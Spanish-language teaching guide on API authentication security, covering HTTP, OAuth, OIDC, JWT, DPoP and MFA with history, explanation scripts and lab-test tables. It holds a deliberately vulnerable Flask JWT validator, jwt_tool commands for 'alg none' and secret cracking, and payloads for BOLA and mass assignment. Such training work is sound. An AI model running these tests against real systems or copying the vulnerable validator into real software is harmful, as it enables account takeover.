- **Qué es:** el protocolo de aplicación de la web. Todo lo demás (OAuth, JWT, cookies) **viaja dentro**
  de HTTP.
- **Cómo se usa acá:** los tokens viajan en **cabeceras** (`Authorization`), **cookies** o, mal, en la
  **query string**. Las cabeceras son el lugar correcto.
- **Qué mirar:** *request smuggling*, desincronización entre proxy y backend, y el hecho de que la
  **query string** termina en logs, `Referer` e historial. RFC 9700 (2025) prohíbe el token en la URL.
- **Ejemplo:** `Authorization: Bearer eyJhbGciOiJSUzI1NiIs...`

#### TLS / SSL y mTLS

- **Qué es:** la capa que cifra y autentica el canal. **SSL** (Netscape, mediados de los 90) fue el
  origen; hoy hablamos de **TLS 1.2/1.3**. HTTPS es HTTP dentro de TLS.
- **Cómo se usa acá:** sin HTTPS, el bearer token se lee al pasar. **mTLS** (mutual TLS) hace que *ambas*
  partes presenten certificado, lo que da **autenticación fuerte de cliente** y permite **atar el token
  al certificado** (RFC 8705).
- **Qué mirar:** versiones viejas de TLS, certificados mal validados (el error de "ignorar la
  verificación"), terminación TLS que rompe la atadura del token, y *pinning* mal hecho que rompe la app.

#### DNS, TCP y QUIC

- **Qué es:** DNS resuelve nombres; TCP transporta; QUIC (sobre UDP) sostiene HTTP/3.
- **Dónde aparece:** en **SSRF** (una API que resuelve una URL arbitraria controlada por el atacante),
  en *DNS rebinding* y en la superficie de red de los gateways.
- **Qué mirar:** APIs que aceptan una **URL** sin lista blanca; resolución interna que el atacante puede
  forzar.

#### WebSocket y gRPC (transporte de APIs modernas)

- **Qué es:** WebSocket abre un **canal persistente**; gRPC usa **HTTP/2** con **Protocol Buffers**
  binarios.
- **Qué mirar:** WebSocket suele **autenticar solo al inicio** (el token no se reevalúa por mensaje); gRPC
  suele **no** ser inspeccionado por WAF/ proxy, y expone reflexión y streaming.

### 4.2 Autenticación HTTP clásica

#### HTTP Basic y Digest (RFC 2617 → RFC 7616)

- **Qué es:** Basic manda `usuario:contraseña` en **Base64** (no es cifrado). Digest manda un **hash**
  con *nonce*.
- **Primera aparición:** RFC 2617 (1999); actualizado por RFC 7616 (2015, con SHA-256).
- **Dónde vive hoy:** autenticación de **cliente** en OAuth (`client_secret_basic`), sistemas internos.
- **Qué mirar:** Basic sobre HTTP sin TLS; credenciales en logs; reutilización en todas las llamadas.

#### Cookies de sesión (RFC 6265)

- **Qué es:** estado que el navegador guarda y reenvía. Creadas por Netscape (1996), estandarizadas en
  RFC 6265 (2011).
- **Cómo se usa acá:** el ID de sesión es, en la práctica, **un bearer token guardado en el navegador**.
- **Qué mirar:** falta de `HttpOnly`, `Secure`, `SameSite`; CSRF; fijación de sesión; XSS que roba la
  cookie.

#### API keys

- **Qué es:** un secreto estático que identifica al cliente (no al usuario).
- **Dónde aparece:** servicios internos, APIs de terceros, `.env` y CI.
- **Qué mirar:** claves en repositorios y logs; sin expiración; sin permisos finos; imposibles de rotar
  sin romper todo.

### 4.3 Federación en XML

#### WS-Security, SAML 2.0 y XML-DSig

- **Qué es:** **SAML 2.0** (OASIS, 2005) transporta **aserciones** de identidad firmadas; **WS-Security**
  (2004) define cómo firmar/ cifrar mensajes SOAP; **XML-DSig** es la firma XML.
- **Cómo funciona:** el IdP emite una aserción firmada con `Subject`, `Conditions`, `AttributeStatement`;
  la app confía en el IdP y crea sesión.
- **Qué mirar:** *XML Signature Wrapping* y canonicalización, aserciones sin verificar firma,
  condiciones (`NotBefore`/`NotOnOrAfter`) ignoradas, y el famoso *SAML "comment" injection*.
- **Por qué importa hoy:** SAML sigue siendo el rey del **SSO empresarial**. Es XML, pesado, pero
  probado en décadas de banca y gobierno.

### 4.4 OAuth y OpenID Connect

![Familia de tokens y flujo de emisión](img/02_token_family.png)

#### OAuth 1.0 (RFC 5849)

- **Primera aparición:** borrador dic. 2007; RFC 5849 en 2010.
- **Cómo funciona:** firma de cada request con **HMAC-SHA1**, `nonce` y `timestamp`.
- **Qué mirar (histórico):** implementación frágil, relojes, secreto en el cliente.
- **Por qué importa:** explica **por qué** OAuth 2.0 eligió la simplicidad del bearer.

#### OAuth 2.0 (RFC 6749) y bearer (RFC 6750)

- **Primera aparición:** octubre de 2012.
- **Cómo funciona:** cuatro roles (**dueño**, **cliente**, **servidor de autorización**, **servidor de
  recursos**) y flujos (*grants*) para obtener un **access token**, que se presenta como **bearer**.
- **Qué mirar:** el propio §10.3 (no se puede confirmar a quién se emitió el token); *redirect URI*
  abiertos; el *authorization code* reusable sin PKCE; CSRF en el callback (`state` ausente).

#### El tipo MAC (abandonado)

- **Primera aparición:** borrador de febrero de 2012; **abandonado**.
- **Qué proponía:** un token con **prueba de posesión** (el cliente demuestra que tiene una clave).
- **Por qué se cayó:** complejidad de canonicalización e interoperabilidad.
- **Por qué importa:** es el **eslabón perdido**: lo que hoy reintentan **mTLS** y **DPoP**.

#### PKCE (RFC 7636)

- **Primera aparición:** 2015. Obligatorio en **authorization code** según RFC 9700 (2025).
- **Cómo funciona:** el cliente genera un `code_verifier`, manda su hash (`code_challenge`) al pedir el
  código, y prueba el `verifier` al canjearlo. Así, un código **robado** no sirve.
- **Qué mirar:** PKCE "en texto plano" (`plain`) en apps públicas; clientes que aceptan códigos sin
  verificar `challenge`.

#### OpenID Connect (OIDC Core 1.0)

- **Primera aparición:** final, 26 de febrero de 2014.
- **Cómo funciona:** una capa de **identidad** sobre OAuth 2.0. Agrega el **ID token** (un JWT con
  `iss`, `sub`, `aud`, `exp`, `amr`, `acr`) y el endpoint `UserInfo`.
- **Qué mirar:** validar **firma**, `iss`, `aud`, `exp` y `nonce`; no confundir el **ID token** (para la
  app) con el **access token** (para la API).

#### Introspección (RFC 7662) y revocación (RFC 7009)

- **Qué son:** el primero permite que el servidor de recursos **pregunte** al de autorización si un token
  sigue válido; el segundo permite **revocarlo**.
- **Primera aparición:** 2015 y 2013, respectivamente.
- **Qué mirar:** introspección en cada request (costo/latencia) y revocación que en realidad **no se
  propaga** a todas las réplicas.

### 4.5 JOSE: la familia de JWT

![Anatomía de un JWT](img/03_jwt_anatomy.png)

- **JWS (RFC 7515):** firma. **JWE (RFC 7516):** cifrado. **JWK (RFC 7517):** claves. **JWA (RFC 7518):**
  algoritmos. **JWT (RFC 7519):** el token con claims. **JWT BCP (RFC 8725, 2020):** las reglas para no
  equivocarse. **RFC 9068 (2021):** perfil de JWT para access tokens.
- **Cómo funciona:** `header.payload.signature`, todo en **Base64url**. **Está firmado, no cifrado**: el
  payload se lee.
- **Qué mirar:** `alg: none` y confusión **RS256→HS256**; `exp`/`aud`/`iss` sin validar; claves débiles
  crackeables; `kid` que apunta a un JWKS controlado por el atacante.
- **Ejemplo de claim clave:** `amr: ["pwd","otp"]` (RFC 8176) dice **cómo** se autenticó; `acr` dice con
  qué nivel.

### 4.6 Atar el token a su portador

![Del bearer a los tokens sender-constrained](img/07_sender_constrained.png)

#### Token Binding (RFC 8471-8473)

- **Primera aparición:** 2018. Ataba el token al **canal** (TLS) en el que se emitió.
- **Qué pasó:** **sin adopción masiva**; quedó como intento. Lección: la teoría correcta no basta si el
  ecosistema no acompaña.

#### mTLS atado a certificado (RFC 8705)

- **Primera aparición:** 2020.
- **Cómo funciona:** el token queda **ligado al `cnf` (thumbprint) del certificado** del cliente; el
  servidor exige el certificado en cada llamada. Robar el token **no alcanza**.
- **Qué mirar:** PKI y rotación de certificados; *proxy* o balanceador que rompe el mTLS; validar el
  certificado del lado correcto.

#### DPoP (RFC 9449)

- **Primera aparición:** 2023.
- **Cómo funciona:** el cliente firma una **prueba** (un JWT propio) con su clave privada, atada al
  request vía `htm` (método) y `htu` (URL), con `jti` único y `iat`. El servidor valida la prueba y
  **no acepta el token sin ella**. Robar el access token **no sirve**.
- **Qué mirar:** ventana de `iat`, almacenamiento de `jti` para evitar reenvíos, claves de cliente bien
  resguardadas, y que el *resource server* **exija** DPoP (no que lo acepte como opcional).

### 4.7 Factores de autenticación (MFA)

![La MFA protege un instante; el token vive mucho más](img/05_mfa_timeline.png)

**La MFA protege la emisión, no el uso.** El segundo factor se pide una vez; el access token que sale
de ahí puede vivir minutos, días o meses. Entre el login y la última llamada, la MFA ya no opina.

- **OTP: HOTP (RFC 4226, 2005) y TOTP (RFC 6238, 2011).** Códigos de un solo uso basados en un secreto
  compartido; TOTP es el "código de 6 dígitos de 30 segundos".
- **Push y notificaciones:** cómodas y **phishable** (fatiga MFA).
- **Passkeys / WebAuthn-FIDO2 (W3C/FIDO):** llaves resistentes al *phishing*, atadas al **origen**. El
  segundo factor más fuerte del lado persona.
- **NIST SP 800-63-4 (2025):** marco de identidad digital; empuja lo *phishing-resistant* y limita los
  factores débiles (SMS/OTP).

![Persona vs. sistema: dos preguntas distintas](img/06_person_vs_system.png)

**No es lo mismo autenticar personas que sistemas.** Del lado persona, la pregunta es "¿este humano es
quien dice ser, con un segundo factor?". Del lado **sistema**, no hay humano que factorizar: la pregunta
es "¿este *workload* es el que dice ser, y con qué credencial efímera?". Y hay un tercer caso, la
identidad **delegada**: una app que actúa **en nombre** de un usuario (OAuth) — donde el consentimiento,
el `scope` y la revocación son el centro.

- **Lo que ninguna MFA resuelve:** en flujo sistema a sistema no hay factor humano; y **una vez emitido
  el token**, la MFA ya no controla el uso.


### 4.8 Gestión de identidades y otros estándares de contexto

- **SCIM (RFC 7643/7644, 2015):** aprovisionamiento de usuarios entre IdP y aplicaciones. Es una **API**
  con su propio token: otra vez, la cadena de confianza.
- **LDAP / Kerberos:** directorios y autenticación **corporativa**; aparecen detrás del IdP cuando la
  federación es hacia el mundo Windows/AD.
- **RADIUS:** autenticación de **red** (VPN, Wi-Fi corporativo); puede ser un paso previo a la MFA.
- **Zero Trust (NIST SP 800-207, 2020):** no confiar por estar "dentro"; verificar **cada** solicitud.
  Es el paraguas conceptual donde encajan mTLS, DPoP y la autorización por objeto.

### 4.9 Tabla maestra de primeras apariciones

| Mecanismo | Primera aparición | Tipo |
|---|---|---|
| Cookies | 1996 (Netscape) → RFC 6265 (2011) | sesión |
| HTTP Basic / Digest | RFC 2617 (1999) → RFC 7616 (2015) | autenticación |
| WS-Security | OASIS 2004 | firma SOAP |
| SAML 2.0 | OASIS 2005 | federación XML |
| HOTP | RFC 4226 (2005) | OTP |
| OAuth 1.0 | borrador dic. 2007 → RFC 5849 (2010) | delegación firmada |
| JWT | borrador 28 dic. 2010 → RFC 7519 (2015) | token con claims |
| TOTP | RFC 6238 (2011) | OTP |
| OAuth 2.0 + bearer | RFC 6749 y RFC 6750 (oct. 2012) | delegación portadora |
| MAC (token) | borrador feb. 2012 | prueba de posesión (abandonado) |
| Revocación | RFC 7009 (2013) | ciclo de vida |
| OpenID Connect | final 26 feb. 2014 | identidad |
| PKCE | RFC 7636 (2015) | seguridad del código |
| Introspección | RFC 7662 (2015) | validación |
| SCIM | RFC 7643/7644 (2015) | aprovisionamiento |
| amr | RFC 8176 (2017) | claims |
| Token Binding | RFC 8471-8473 (2018) | prueba de posesión (sin adopción) |
| mTLS atado | RFC 8705 (2020) | sender-constrained |
| JWT BCP | RFC 8725 (2020) | buenas prácticas |
| RFC 9068 | 2021 | perfil de access token |
| DPoP | RFC 9449 (2023) | prueba de posesión |
| RFC 9700 | enero 2025 | mejores prácticas OAuth |
| NIST SP 800-63-4 | julio 2025 | identidad digital |

### 4.10 Cómo leer todo esto en una sola imagen

![Ciclo de vida de un token](img/10_lifecycle.png)

Cada protocolo de arriba actúa en una **etapa** del ciclo: **emisión** (OAuth/OIDC/MFA), **transporte**
(TLS/cookies/cabeceras), **uso** (bearer/mTLS/DPoP), **expiración** (`exp`), **rotación** (refresh) y
**revocación** (RFC 7009). Defender una API es **cubrir todas las etapas**, no solo la emisión.

## 5. Módulos técnicos

> En cada módulo: **Idea · Guion · Ejemplo práctico · Vulnerabilidades y cómo comprobarlas · Defensa.**
> Recordá: las comprobaciones ofensivas van **sólo** contra laboratorios o entornos autorizados.

---

## M1 — HTTP Basic / Digest (1999)

### Idea
Autenticación HTTP clásica: el cliente manda credenciales (Basic: `usuario:contraseña` en Base64) en **cada** petición. **Primera aparición: RFC 2617, junio de 1999**; Digest añade un hash y un `nonce`; **RFC 7616 (agosto de 2015)** moderniza Digest con SHA-256 y reemplaza a la 2617.

### Guion para explicar
"Basic es como darle a alguien la llave de tu casa para que entre a revisar una habitación: le das la llave, no un permiso para esa habitación. Viaja en cada request, y si mirás el valor, no está cifrado: está codificado. Base64 no es seguridad; es transporte tolerante a caracteres."

### Ejemplo que puedo hacer
```bash
# Endpoint público de práctica (no es un sistema de terceros real)
curl -v -u usuario:clave https://httpbin.org/basic-auth/usuario/clave

# Mirar la cabecera
curl -s -u usuario:clave https://httpbin.org/basic-auth/usuario/clave -D -
```
En el navegador: DevTools → Network → cualquier request con `Authorization: Basic ...` → copiá el valor y decodificalo:
```bash
echo -n "dXN1YXJpbzpjbGF2ZQ==" | base64 -d
```

### Vulnerabilidades y cómo comprobarlas (en tu entorno)
| Vulnerabilidad | Cómo se comprueba (autorizado) |
|---|---|
| Credenciales reutilizadas por request | Interceptá una request con un proxy (Burp/ZAP) en **tu** app y reenviala: sigue autenticando todo el tiempo |
| No hay "logout" real | Guardá la cabecera y usala de nuevo tras "cerrar sesión" en tu app: si sigue funcionando, no hay revocación |
| Base64 ≠ cifrado | Decodificá la cabecera (comando de arriba) |
| Fuerza bruta | En tu app, medí si hay rate-limit/lockout enviando N intentos de tu propio usuario de prueba |
| Credenciales en logs/URLs | Buscá en tus propios logs si aparece el header; en APIs de prueba, probá una URL con user:pass |

### Defensa
TLS obligatorio, migrar a tokens/OIDC, rate-limit y lockout, nunca loguear credenciales, nunca usar Basic en URLs.

---

## M2 — Cookies y sesiones (1996)

### Idea
El servidor guarda el estado y el navegador repite un **identificador de sesión** en una cookie. **Primera aparición: especificación de cookies de Netscape, 1996; RFC 2109 (1998); RFC 6265 (abril de 2011)** es la vigente.

### Guion para explicar
"La sesión en servidor es segura para la web tradicional y mala para APIs: el estado no escala, no delega y no cruza clientes. Pero trae dos problemas clásicos que seguimos viendo: robo de cookie por XSS y CSRF."

### Ejemplo que puedo hacer
- En tu app: login → DevTools → Application → Cookies → observá `HttpOnly`, `Secure`, `SameSite`.
- Con `curl` (tu app): `curl -c cookies.txt -d 'user=...&pass=...' https://TU-APP/login` y luego `curl -b cookies.txt https://TU-APP/perfil`.

### Vulnerabilidades y cómo comprobarlas
| Vulnerabilidad | Cómo se comprueba (autorizado/lab) |
|---|---|
| Cookie sin `HttpOnly` → XSS la lee | En un lab (PortSwigger XSS / Juice Shop) inyectá `document.cookie` y verificá que la sesión es accesible |
| Sin `SameSite` → CSRF | Lab de CSRF de PortSwigger: formulario que dispara una acción autenticada |
| Session fixation | En tu app: fijá vos el valor de la cookie antes del login y verificá si el servidor la respeta |
| Sesión no se invalida al logout | Reutilizá la cookie vieja tras logout: si sirve, no hay revocación |
| Falta de rotación de sesión | Compará el ID de sesión antes y después del login (debería cambiar) |

### Defensa
`HttpOnly` + `Secure` + `SameSite`, rotar el ID en el login, invalidar en el servidor al logout, tiempo de inactividad, tokens CSRF.

---

## M3 — API keys (mediados de los 2000)

### Idea
No tienen RFC: son práctica de industria, popularizadas con la nube (**access keys de AWS, 2006**). Identifican a un sistema, **no autentican a una persona**, y por defecto **no expiran**.

### Guion para explicar
"La API key es el bearer token más usado y menos cuidado del mundo. Es un identificador estático que se mete en un archivo, en una variable de entorno o —peor— en el JavaScript de un frontend, donde cualquiera lo lee. Identifica, no autentica."

### Ejemplo que puedo hacer
```bash
curl -H "X-API-Key: TU_CLAVE_DE_PRUEBA" https://httpbin.org/headers
```
Para mostrar extracción: en **tu propia** web/app, DevTools → Network → buscá `api_key`, `apikey`, `token` en las requests del cliente.

Escaneo de **tus propios** repos (no de terceros):
```bash
# gitleaks o ggshield sobre tu repo
gitleaks detect --source . -v
```

### Vulnerabilidades y cómo comprobarlas
| Vulnerabilidad | Cómo se comprueba |
|---|---|
| Clave hardcodeada en el cliente | DevTools/descompilar tu app; buscá el secreto en el bundle |
| Clave en el repositorio | `gitleaks`, `ggshield`, `trufflehog` sobre tu repo/CI |
| Sin expiración ni rotación | Verificá que la clave sigue funcionando después de meses (tu entorno) |
| Sin scope ni límites | Usá la clave "de solo lectura" para intentar una operación de escritura en tu API |
| Sin rate limit | Enviá N requests a tu endpoint con la misma key y medí 429/423 |

### Defensa
Rotación, revocación, scope, IP allowlist, rate limit, secret manager, detección en CI (secret scanning). Dato para citar: **28,65 M de secretos nuevos en commits públicos de GitHub en 2025 (+34 %)** — [GitGuardian, State of Secrets Sprawl 2026](https://blog.gitguardian.com/the-state-of-secrets-sprawl-2026/).

---

## M4 — OAuth 1.0 (firma HMAC) (2007 / 2010)

### Idea
Antes del bearer, OAuth **firmaba cada request** con HMAC-SHA1 y un secreto compartido. **Especificación comunitaria, diciembre de 2007; RFC 5849, abril de 2010.** El token no se puede copiar y reusar: la firma está atada al método, la URL y los parámetros. Es el ancestro conceptual de DPoP.

### Guion para explicar
"OAuth 1.0 era la antítesis del bearer: nada de mandar un string reutilizable, cada request se firmaba. Más seguro en teoría, carísimo en la práctica: canonicalizar parámetros, secretos compartidos por cada par de servicios, y una pesadilla en móviles. El mundo eligió simplicidad y nació el bearer."

### Ejemplo que puedo hacer
Construir la firma conceptualmente en Python (sin llamar a nadie):
```python
import hmac, hashlib, base64, urllib.parse
method = "GET"
url = "https://api.ejemplo.com/recurso"
params = {"oauth_consumer_key": "key", "oauth_nonce": "abc123", "oauth_timestamp": "1700000000"}
base = "&".join([method, urllib.parse.quote(url, safe=""),
                 urllib.parse.quote("&".join(f"{k}={params[k]}" for k in sorted(params)), safe="")])
signature = base64.b64encode(hmac.new(b"secreto", base.encode(), hashlib.sha1).digest())
print("oauth_signature =", urllib.parse.quote(signature))
```
Mostrá que cambiar **un solo parámetro** invalida la firma: eso es lo que el bearer no tiene.

### Vulnerabilidades y cómo comprobarlas
| Vulnerabilidad | Cómo se comprueba (lab propio) |
|---|---|
| Errores de canonicalización | Alterá el orden/encoding de parámetros y observá si la firma valida o no |
| Secreto compartido filtrado | Si el secreto se filtra, se pueden firmar requests: probá en tu implementación de práctica |
| Sin anti-replay (nonce/timestamp) | Reenviá la misma request firmada dos veces contra tu lab: ¿la acepta? |
| Complejidad de implementación | Compará líneas de código vs. un flujo bearer |

### Defensa
Nonce + timestamp anti-replay, secretos por par, TLS. Hoy: migrar a DPoP en vez de reimplementar OAuth 1.0.

---

## M5 — Bearer token (OAuth 2.0) (2012)

![Dónde viaja el token: cabecera, cookie o query](img/04_transport.png)

### Idea
OAuth 2.0 separa autorización de autenticación y entrega al cliente un **access token**: un string con alcance y vida. **RFC 6749, octubre de 2012**; su uso bearer, **RFC 6750, octubre de 2012**. La regla: **quien tiene el token, lo usa.** La propia norma lo admite en **RFC 6749 §10.3**: *"This specification does not provide any methods for the resource server to ensure that an access token presented to it by a given client was issued to that client by the authorization server."*

### Guion para explicar
"El bearer ganó por simplicidad: un string en una cabecera, sin firmar cada request, sin secretos compartidos. El precio está escrito en la norma: el servidor de recursos no puede saber si quien presenta el token es a quien se le emitió. Ese es el corazón de esta clase."

### Ejemplo que puedo hacer
```bash
# Con TU token (de tu cuenta / tu entorno)
curl -H "Authorization: Bearer TU_TOKEN" https://httpbin.org/bearer

# Inspeccionar la forma de la cabecera en DevTools de TU app
# Network -> Request Headers -> Authorization: Bearer eyJ...
```
**Demostración de reutilización (sólo tu cuenta, tu entorno):** copiá tu token a un `curl` en otra terminal —atelada al mismo host de tu app— y comprobá que el servidor lo acepta sin más. Eso *es* el punto de la charla; no lo hagas contra terceros.

### Vulnerabilidades y cómo comprobarlas
| Vulnerabilidad | Cómo se comprueba (tu entorno) |
|---|---|
| Replay: el token no está atado al cliente | Copiá el token y usalo desde otro cliente (curl) contra tu API |
| Token en URL/query | Buscá tokens en logs, en el header `Referer` o en el historial (tu app) |
| Vida demasiado larga | Decodificá `exp` (JWT) o medí cuánto sigue vivo un token opaco |
| Sin revocación | Probá tu token después de "cerrar sesión": si sigue válido, no hay revocación (RFC 7009) |
| Sobre-privilegio | Pedí un token con scope amplio en tu client y usá un endpoint fuera del scope mínimo |
| Transporte inseguro | Verificá que tu API sólo acepta HTTPS y rechaza el token por HTTP |

### Defensa
Vida corta, `aud` estricto, scope mínimo, revocación (RFC 7009) e introspección (RFC 7662), nunca en query (**RFC 9700, enero 2025** lo prohíbe), y sender-constrained (M9).

---

## M6 — JWT (2010 / 2015)

![Anatomía de un JWT](img/03_jwt_anatomy.png)

### Idea
**JWT (JSON Web Token)**: `header.payload.signature`, base64url. **Primer borrador: 28 de diciembre de 2010; RFC 7519, mayo de 2015** (familia JOSE: JWS 7515, JWE 7516, JWK 7517, JWA 7518). El payload **no está cifrado**: está firmado. El header trae `alg` y `kid`.

### Guion para explicar
"Un JWT es como una credencial plastificada: firmada, no sellada. Cualquiera lee el contenido. Y guarda una trampa: el header dice con qué algoritmo se firmó; si el validador le hace caso al token en lugar de a su configuración, el atacante elige el algoritmo. De ahí salen `alg: none`, la confusión RS256→HS256 y la inyección de `kid`."

### Ejemplo que puedo hacer
Generá y decodificá tu propio JWT (nada de terceros):
```python
# pip install pyjwt
import jwt
token = jwt.encode({"sub": "123", "scope": "read", "iss": "https://mi-lab"}, "secreto", algorithm="HS256")
print(token)
print(jwt.decode(token, "secreto", algorithms=["HS256"]))
```
Decodificá el payload **sin verificar** para ver que base64 no oculta nada:
```bash
python -c "import base64,sys; p=sys.argv[1].split('.')[1]; print(base64.urlsafe_b64decode(p+'='*(-len(p)%4)).decode())" eyJ...
```

### Vulnerabilidades y cómo comprobarlas (en laboratorio propio)

**Montá un lab minúsculo** (Flask) que acepte JWT, para probar los clásicos sin tocar a nadie:

```python
# lab_jwt.py  ->  flask run  (sólo local)
from flask import Flask, request, jsonify
import jwt
app = Flask(__name__)
@app.route("/perfil")
def perfil():
    tok = request.headers.get("Authorization", "").replace("Bearer ", "")
    try:
        # ATAJO VULNERABLE A PROPÓSITO: confía en el alg del token y usa la clave como secreto
        data = jwt.decode(tok, "secreto", algorithms=None, options={"verify_signature": True})
        return jsonify(data)
    except Exception as e:
        return str(e), 401
```

| Ataque | Cómo se comprueba (contra EL LAB de arriba) |
|---|---|
| `alg: none` | Generá un token con `{"alg":"none"}` y sin firma; si el servidor lo acepta, es vulnerable |
| Confusión RS256→HS256 | Si el server verifica con clave pública, intentá firmar con HS256 usando esa clave pública como secreto |
| `kid` injection | Enviá `kid` apuntando a un archivo/ruta conocida; observá si cambia la clave usada |
| Secreto débil (HS256) | Crackeá **tu propio** token con `hashcat`/`jwt_tool` y un diccionario: `jwt_tool eyJ... -C -d rockyou.txt` |
| Sin `exp` / `aud` | Generá un token sin expiración o con otra `aud` y probá si el endpoint lo acepta |
| Firma no verificada | Cambiá un byte del payload sin refirmar; si pasa, no verifica firma |

Con `jwt_tool` (todo contra tu lab):
```bash
git clone https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py eyJ... -M at      # prueba alg none
python3 jwt_tool.py eyJ... -C -d wordlist.txt   # crackea el secreto
```

### Defensa
`alg` **desde la configuración del validador**, nunca del token; verificar `iss`, `aud`, `exp`, `nbf`; claves fuertes; rotación de claves (`kid` correcto); validar contra JWKS; y **RFC 8725 (febrero 2020)** + [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html).

---

## M7 — OIDC, authorization code, PKCE e ID token (2014)

![Flujos de OAuth 2.0: cuáles usar y cuáles se retiraron](img/08_oauth_flows.png)

### Idea
**OpenID Connect Core 1.0**, final aprobado el **26 de febrero de 2014**, es la capa de identidad sobre OAuth 2.0. Flujo *authorization code*: **RFC 6749 §4.1 (2012)**, código de un solo uso (si se reutiliza, la norma exige denegar y revocar, §4.1.2). **PKCE: RFC 7636, agosto de 2015.** El **ID token** es un JWT que dice *quién* es la persona y *cómo* se autenticó (`auth_time`, `amr`, `acr`) y **no sirve para acceder a recursos**.

### Guion para explicar
"El authorization code es el cupón de un solo uso que cambia un artefacto público —lo que viaja por el navegador— por uno privado. PKCE le agrega un candado: aunque te roben el código, no lo podés canjear sin el verificador. Y el ID token es el DNI que te muestran en la puerta, no el pase que te ponen en la muñeca para entrar al recinto."

### Ejemplo que puedo hacer (flujo, sin llamar a sistemas de terceros)
Con tu propio lab (Keycloak local, o el proyecto de práctica):
```
1) /authorize?response_type=code&client_id=lab&redirect_uri=http://localhost/cb
   &scope=openid&state=RANDOM&code_challenge=...&code_challenge_method=S256
2) el usuario (vos) se autentica en el lab
3) /cb?code=XXXX&state=RANDOM
4) POST /token  code=XXXX + code_verifier=...  -> access_token, id_token, refresh_token
```
Decodificá el **id_token** localmente y mirá `iss`, `aud`, `auth_time`, `amr`, `nonce`.

### Vulnerabilidades y cómo comprobarlas
| Vulnerabilidad | Cómo se comprueba (lab propio / tu integración) |
|---|---|
| Sin PKCE → código interceptable | Repetí el flujo **de tu lab** sin `code_challenge` e intentá canjear el código con otro cliente |
| `redirect_uri` laxa | En tu lab, probá un `redirect_uri` no registrado (p. ej. un subpath o dominio parecido) |
| Falta de `state` → CSRF | Iniciá el login y manipulá/eliminá el `state`: ¿acepta la respuesta? |
| Falta de `nonce` → replay del ID token | Reutilizá un ID token viejo en tu cliente y verificá si valida `nonce`/`auth_time` |
| *Mix-up attack* | En lab con dos IdP, cruzá respuestas entre proveedores |
| ID token usado como access token | Probá mandar el ID token al endpoint de recursos de tu lab: debe rechazarse |
| Rate-limit en login | Enviá N intentos de tu usuario de práctica y medí bloqueo |

### Defensa
PKCE obligatorio (lo exige **RFC 9700**), `redirect_uri` exacta, `state` y `nonce`, validar `iss`/`aud`/`exp`/`nonce` en el RP, no usar el ID token como access token.

---

## M8 — Refresh token (2012)

![Ciclo de vida de un token](img/10_lifecycle.png)

### Idea
Token de vida larga que **sólo** se usa contra el endpoint de token para obtener nuevos access tokens. **RFC 6749 §§1.5 y 6 (octubre de 2012)**; rotación sugerida en **§10.4**; **RFC 9700 (enero de 2025)** la exige para clientes públicos. Revocación: **RFC 7009, octubre de 2013**.

### Guion para explicar
"El access token es el boleto de la función; el refresh token es la acreditación que te deja pedir uno nuevo sin volver a la taquilla. La rotación convierte al refresh en un artefacto de un solo uso: si un atacante lo usa, el legítimo lo delata."

### Ejemplo que puedo hacer
En tu lab: guardá el refresh token, pedí un access token nuevo y observá si el refresh **cambia** (rotación) y si el viejo queda **inválido** (detección de reuso).

### Vulnerabilidades y cómo comprobarlas
| Vulnerabilidad | Cómo se comprueba (lab/tu integración) |
|---|---|
| Sin rotación | Reutilizá el mismo refresh token dos veces: si ambas funcionan, no hay rotación |
| Sin detección de reuso | Usá el refresh viejo después de rotar: si sigue vivo, no hay detección |
| Vida infinita | Verificá si hay `exp` o política de caducidad absoluta |
| Almacenamiento inseguro | En tu app, buscá el refresh en `localStorage`/almacenamiento sin cifrar del cliente |
| Refresh usado contra la API de recursos | Mandá el refresh a un endpoint de recursos de tu lab: debe rechazarse |

### Defensa
Rotación + detección de reuso, vida absoluta, binding al cliente, almacenamiento seguro, revocación en logout/cambio de contraseña.

---

## M9 — mTLS y DPoP (sender-constrained) (2020 / 2023)

![Del bearer a los tokens sender-constrained](img/07_sender_constrained.png)

### Idea
Atar el token a su portador. **mTLS + token atado a certificado: RFC 8705, febrero de 2020.** **DPoP: RFC 9449, octubre de 2023.** Con DPoP, el cliente firma cada request con su clave privada; el token sólo sirve presentado con esa prueba.

### Guion para explicar
"Si el problema del bearer es que cualquiera que lo tenga lo usa, la solución es exigir algo más que la posesión. mTLS ata el token al certificado; DPoP ata el token a una clave privada que el cliente prueba en cada request. Es la idea de OAuth 1.0, pero bien integrada. RFC 9700 (2025) ya los recomienda."

### Ejemplo que puedo hacer
DPoP — construí una prueba **conceptual** con Python (sin servidor real):
```python
# La prueba DPoP es un JWT firmado por el CLIENTE con su clave privada
# Header típico: {"typ":"dpop+jwt","alg":"ES256","jwk":{...}}
# Claims: jti (único), htm (método), htu (URL), iat
# El servidor rechaza si htm/htu no coinciden con el request, o si el jti se repite
```
Para una prueba real y segura, levantá **Keycloak en Docker** (soporta DPoP) y hacé el flujo contra tu propio Keycloak.

### Vulnerabilidades y cómo comprobarlas
| Vulnerabilidad | Cómo se comprueba (lab propio) |
|---|---|
| DPoP sin validar `htm`/`htu` | Cambiá el método o la URL del request manteniendo la prueba: ¿lo acepta? |
| Replay de la prueba (`jti`) | Reenviá la misma prueba dos veces: debe rechazarse |
| `ath` ausente | Presentá el access token sin atar la prueba al token (`ath` = hash del access token) |
| Nonce de servidor ignorado | Si el server exige nonce, probá sin él |
| mTLS mal configurado | En tu lab, probá presentar un token atado a un certificado **sin** el certificado: debe fallar |

### Defensa
Validar `htm`, `htu`, `jti` (anti-replay), `ath`, `alg` permitido; rotación de claves; y **RFC 9449 / RFC 8705**.

---

## M10 — OWASP API Security Top 10 (laboratorio)

![OWASP API Security Top 10 (2023)](img/11_owasp_top10.png)

Éste es el "atlas" para elegir qué probar. Cada ítem con su forma de comprobarlo **en un lab** ([OWASP API Security Top 10 – 2023](https://owasp.org/API-Security/editions/2023/en/0x11-t10/)).

| # | Riesgo | Cómo se comprueba (lab) | Herramienta |
|---|---|---|---|
| API1 | **BOLA** — Broken Object Level Authorization | Con **tu** token, cambiá el ID del objeto por otro del lab (`/api/pedidos/1234` → `5678`) y mirá si devuelve datos ajenos | Burp/Postman + ffuf |
| API2 | **Broken Authentication** | Login sin rate-limit, JWT sin validar, credenciales por defecto | jwt_tool, Burp Intruder |
| API3 | **BOPLA / Mass Assignment** | Mandá campos extra (`"rol":"admin"`, `"saldo":999`) y observá si se aplican | Postman |
